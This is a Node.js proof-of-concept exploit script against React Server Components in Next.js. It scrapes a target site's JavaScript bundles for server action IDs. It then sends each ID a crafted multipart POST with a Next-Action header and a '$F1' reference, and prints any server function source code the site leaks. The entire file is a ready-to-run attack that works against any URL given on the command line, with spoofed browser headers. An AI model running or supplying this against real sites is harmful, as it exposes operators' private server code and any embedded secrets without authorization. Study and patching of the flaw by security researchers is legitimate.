#!/usr/bin/env node
/**
 * RSC Vulnerability PoC: Extract Source Code from All Server Actions
 * 
 * This script automatically:
 * 1. Discovers all server action IDs from the target
 * 2. Attempts to extract source code from each action
 * 
 * Usage:
 *   node poc-extract-all-sources.js <url>
 *   node poc-extract-all-sources.js https://example.com/page
 *   node poc-extract-all-sources.js http://localhost:3005
 */

const TARGET = process.argv[2];

if (!TARGET) {
  console.error('Usage: node poc-extract-all-sources.js <url>');
  console.error('Example: node poc-extract-all-sources.js https://example.com');
  process.exit(1);
}

const BROWSER_HEADERS = {
  'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
  'Accept-Language': 'en-US,en;q=0.9',
  'Cache-Control': 'no-cache',
};

const ACTION_ID_PATTERN = /[a-f0-9]{42}/g;

async function fetchPage(url) {
  const response = await fetch(url, { headers: BROWSER_HEADERS });
  return response.text();
}

async function extractJsUrls(html, baseUrl) {
  const jsUrls = new Set();
  const srcPattern = /src=["']([^"']*\.js[^"']*)["']/g;
  let match;
  while ((match = srcPattern.exec(html)) !== null) {
    let url = match[1];
    if (url.startsWith('/')) {
      url = new URL(url, baseUrl).href;
    } else if (!url.startsWith('http')) {
      url = new URL(url, baseUrl).href;
    }
    jsUrls.add(url);
  }
  const chunkPattern = /_next\/static\/chunks\/[^"'\s]+\.js/g;
  while ((match = chunkPattern.exec(html)) !== null) {
    jsUrls.add(new URL(match[0], baseUrl).href);
  }
  return Array.from(jsUrls);
}

async function discoverActionIds(target) {
  console.log('[*] Fetching page and JavaScript bundles...');
  
  const html = await fetchPage(target);
  const jsUrls = await extractJsUrls(html, target);
  
  console.log(`[*] Scanning ${jsUrls.length} JavaScript files...`);
  
  const allIds = new Set();
  
  for (const jsUrl of jsUrls) {
    try {
      const jsContent = await fetchPage(jsUrl);
      let match;
      while ((match = ACTION_ID_PATTERN.exec(jsContent)) !== null) {
        if (match[0].startsWith('40')) {
          allIds.add(match[0]);
        }
      }
    } catch (e) {
      // Ignore fetch errors
    }
  }
  
  return Array.from(allIds);
}

function createMultipartPayload(actionId) {
  const boundary = '----AndrewMohawkSpiderMark-ZGVnZW5lcmF0ZXBhcnR5dGltZQ';
  const parts = [
    `--${boundary}`,
    'Content-Disposition: form-data; name="1"',
    '',
    JSON.stringify({ id: actionId, bound: null }),
    `--${boundary}`,
    'Content-Disposition: form-data; name="0"',
    '',
    '["$F1"]',
    `--${boundary}--`
  ];
  return {
    contentType: `multipart/form-data; boundary=${boundary}`,
    body: parts.join('\r\n')
  };
}

async function extractSourceCode(target, actionId) {
  const payload = createMultipartPayload(actionId);
  
  try {
    const response = await fetch(target, {
      method: 'POST',
      headers: {
        ...BROWSER_HEADERS,
        'Accept': 'text/x-component',
        'Content-Type': payload.contentType,
        'Next-Action': actionId,
      },
      body: payload.body
    });

    const text = await response.text();
    const match = text.match(/1:"((?:[^"\\]|\\.)*)"/);
    
    if (match) {
      const result = match[1]
        .replace(/\\n/g, '\n')
        .replace(/\\"/g, '"')
        .replace(/\\\\/g, '\\');
      
      // Check if it contains function source code
      if (result.includes('function') && result.includes('{')) {
        // Extract just the function part
        const funcMatch = result.match(/(async\s+)?function\s+\w+\s*\([^)]*\)\s*\{[\s\S]*\}/);
        if (funcMatch) {
          return { success: true, source: funcMatch[0], raw: result };
        }
        return { success: true, source: result, raw: result };
      }
    }
    
    return { success: false, error: 'No source code in response', raw: text.slice(0, 200) };
    
  } catch (error) {
    return { success: false, error: error.message };
  }
}

async function main() {
  console.log(`
╔══════════════════════════════════════════════════════════════════════════╗
║  RSC Vulnerability: Server Action Source Code Extractor                    ║
║  Discovers all actions and extracts their source code                    ║
╚══════════════════════════════════════════════════════════════════════════╝

Target: ${TARGET}
`);

  // Check if server is reachable
  try {
    await fetchPage(TARGET);
    console.log('[✓] Target is reachable\n');
  } catch (e) {
    console.error(`[!] Cannot reach target: ${e.message}`);
    process.exit(1);
  }

  // Discover action IDs
  let actionIds;
  try {
    actionIds = await discoverActionIds(TARGET);
  } catch (e) {
    console.error(`[!] Failed to discover actions: ${e.message}`);
    process.exit(1);
  }

  if (actionIds.length === 0) {
    console.log('[!] No server action IDs found.');
    console.log('    The target may not use server actions.');
    process.exit(0);
  }

  console.log(`[✓] Found ${actionIds.length} server action(s)\n`);
  console.log('─'.repeat(74));

  // Try to extract source from each action
  let leakedCount = 0;

  for (let i = 0; i < actionIds.length; i++) {
    const actionId = actionIds[i];
    console.log(`\n[${i + 1}/${actionIds.length}] Action: ${actionId}`);
    
    const result = await extractSourceCode(TARGET, actionId);
    
    if (result.success) {
      leakedCount++;
      console.log('    [!] SOURCE CODE LEAKED:');
      console.log('    ' + '─'.repeat(60));
      const lines = result.source.split('\n').slice(0, 15);
      lines.forEach(line => console.log('    ' + line));
      if (result.source.split('\n').length > 15) {
        console.log('    ... (truncated)');
      }
      console.log('    ' + '─'.repeat(60));
    } else {
      console.log(`    [-] No source leaked: ${result.error}`);
    }
  }

  // Summary
  console.log('\n' + '═'.repeat(74));
  console.log('SUMMARY');
  console.log('═'.repeat(74));
  
  console.log(`
Target: ${TARGET}
Actions Found: ${actionIds.length}
Sources Leaked: ${leakedCount}
`);


}

main().catch(e => {
  console.error('Fatal error:', e.message);
  process.exit(1);
});